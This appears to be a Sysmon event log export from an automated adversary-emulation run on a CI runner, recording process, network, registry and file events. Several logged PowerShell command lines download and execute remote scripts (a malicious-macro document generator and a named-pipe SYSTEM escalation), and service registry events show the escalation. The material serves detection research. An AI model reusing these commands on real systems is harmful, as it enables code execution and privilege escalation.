"TimeCreated","Id","Message"
"12/17/2025 7:58:37 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:37.941
ProcessGuid: {f995aebf-62ad-6942-3e04-000000000e00}
ProcessId: 6640
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   Shell`$ `\""""cscript.exe C:\Users\Public\art.jse`\""""`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:37 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:37.680
ProcessGuid: {f995aebf-62ad-6942-3d04-000000000e00}
ProcessId: 9980
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:37 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:37.662
ProcessGuid: {f995aebf-62ad-6942-3c04-000000000e00}
ProcessId: 6556
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:36.838
ProcessGuid: {f995aebf-62ac-6942-3a04-000000000e00}
ProcessId: 9900
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_guh5gcah.2tz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:36.464
ProcessGuid: {f995aebf-62ac-6942-3804-000000000e00}
ProcessId: 7472
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jfkfns41.wqb.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:36.087
ProcessGuid: {f995aebf-62ab-6942-3604-000000000e00}
ProcessId: 6496
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4jpd4xyr.fzr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:35 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:35.704
ProcessGuid: {f995aebf-62ab-6942-3404-000000000e00}
ProcessId: 9456
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_drq3px0v.v4x.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:35.240
ProcessGuid: {f995aebf-62ab-6942-3104-000000000e00}
ProcessId: 8248
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:35.221
ProcessGuid: {f995aebf-62ab-6942-3004-000000000e00}
ProcessId: 4852
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:31 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:31.406
ProcessGuid: {f995aebf-62a7-6942-2b04-000000000e00}
ProcessId: 7064
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hh3ra0qd.ssx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:29 AM","13","Registry value set:
RuleName: T1543.003
EventType: SetValue
UtcTime: 2025-12-17 07:58:29.117
ProcessGuid: {f995aebf-59d7-6942-0c00-000000000e00}
ProcessId: 980
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\svcHighPriv\Start
Details: DWORD (0x00000004)
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:58:29 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:29.110
ProcessGuid: {f995aebf-62a5-6942-2a04-000000000e00}
ProcessId: 2816
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.26100.4484 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: sc.exe  delete svcHighPriv
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=A452BFCB6000D03942DDFADDCDA5A7EB121447ED99B1BA090446B4A989F1F7AE
ParentProcessGuid: {f995aebf-62a5-6942-2804-000000000e00}
ParentProcessId: 7264
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\System32\cmd.exe""  /C sc.exe delete svcHighPriv
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:27.621
ProcessGuid: {f995aebf-62a3-6942-2604-000000000e00}
ProcessId: 4880
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\SystemTemp\__PSScriptPolicyTest_tsyumclx.4wq.psm1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:27.620
ProcessGuid: {f995aebf-62a3-6942-2604-000000000e00}
ProcessId: 4880
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\SystemTemp\__PSScriptPolicyTest_2yr3lwuh.fhr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:27.169
ProcessGuid: {f995aebf-62a3-6942-2204-000000000e00}
ProcessId: 1732
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_shturl1b.cj2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:25 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:23.820
ProcessGuid: {f995aebf-629f-6942-1c04-000000000e00}
ProcessId: 8956
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:25 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:23.825
ProcessGuid: {f995aebf-629f-6942-1c04-000000000e00}
ProcessId: 8956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52070
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:24 AM","13","Registry value set:
RuleName: T1543.003
EventType: SetValue
UtcTime: 2025-12-17 07:58:24.361
ProcessGuid: {f995aebf-59d7-6942-0c00-000000000e00}
ProcessId: 980
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\svcHighPriv\ImagePath
Details: C:\windows\system32\cmd.exe /C echo Uuup! > \\.\pipe\HighPriv
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:58:24 AM","13","Registry value set:
RuleName: T1543.003
EventType: SetValue
UtcTime: 2025-12-17 07:58:24.361
ProcessGuid: {f995aebf-59d7-6942-0c00-000000000e00}
ProcessId: 980
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\svcHighPriv\Start
Details: DWORD (0x00000003)
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:58:24 AM","13","Registry value set:
RuleName: T1543.003
EventType: SetValue
UtcTime: 2025-12-17 07:58:24.361
ProcessGuid: {f995aebf-59d7-6942-0c00-000000000e00}
ProcessId: 980
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\svcHighPriv\Type
Details: DWORD (0x00000010)
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:58:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:24.182
ProcessGuid: {f995aebf-62a0-6942-2004-000000000e00}
ProcessId: 6532
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wv1kbls4.pdn.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:24.019
ProcessGuid: {f995aebf-629f-6942-1c04-000000000e00}
ProcessId: 8956
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\3rejhqwe\3rejhqwe.dll
Hashes: SHA256=3C17DEA272A7A7B07170440D093FFE4EC6D542980AD7940457463AB9F76A5D23
IsExecutable: true
Archived: true"
"12/17/2025 7:58:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:24.006
ProcessGuid: {f995aebf-629f-6942-1e04-000000000e00}
ProcessId: 5500
User: runnervm8j6r3\runneradmin
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\3rejhqwe\3rejhqwe.dll
Hashes: SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
IsExecutable: false
Archived: true"
"12/17/2025 7:58:23 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:23.936
ProcessGuid: {f995aebf-629f-6942-1e04-000000000e00}
ProcessId: 5500
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=8AA62B9BE054D79B6575BEF1DCEDCB2A707741E0245EC876AF4FA0DAB71594FF
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:23 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:23.830
ProcessGuid: {f995aebf-629f-6942-1c04-000000000e00}
ProcessId: 8956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:23.600
ProcessGuid: {f995aebf-629f-6942-1c04-000000000e00}
ProcessId: 8956
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_roy4q2l2.uid.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:23.502
ProcessGuid: {f995aebf-629f-6942-1c04-000000000e00}
ProcessId: 8956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:23 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:58:23.092
ProcessGuid: {f995aebf-629f-6942-1b04-000000000e00}
ProcessId: 6088
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 7:58:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:23.049
ProcessGuid: {f995aebf-629f-6942-1b04-000000000e00}
ProcessId: 6088
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: WMI Provider Host
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Wmiprvse.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {f995aebf-59d9-6942-e403-000000000000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=240C985EED57DEE92E0415F86CE67439E24179EA3281D57A395A90E92F6844D5
ParentProcessGuid: {f995aebf-59d8-6942-0e00-000000000e00}
ParentProcessId: 696
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:56:26 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:56:25.621
ProcessGuid: {f995aebf-6227-6942-0d04-000000000e00}
ProcessId: 7768
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: NT AUTHORITY\SYSTEM
Protocol: tcp
Initiated: false
SourceIsIpv6: false
SourceIp: 127.0.0.1
SourceHostname: runnervm8j6r3
SourcePort: 52021
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 127.0.0.1
DestinationHostname: runnervm8j6r3
DestinationPort: 4444
DestinationPortName: -"
"12/17/2025 7:56:26 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:56:25.620
ProcessGuid: {f995aebf-6227-6942-0904-000000000e00}
ProcessId: 3252
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 127.0.0.1
SourceHostname: runnervm8j6r3
SourcePort: 52021
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 127.0.0.1
DestinationHostname: runnervm8j6r3
DestinationPort: 4444
DestinationPortName: -"
"12/17/2025 7:56:24 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:56:23.379
ProcessGuid: {f995aebf-6227-6942-0904-000000000e00}
ProcessId: 3252
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52019
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:56:24 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:56:23.375
ProcessGuid: {f995aebf-6227-6942-0904-000000000e00}
ProcessId: 3252
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.110.133;::ffff:185.199.109.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
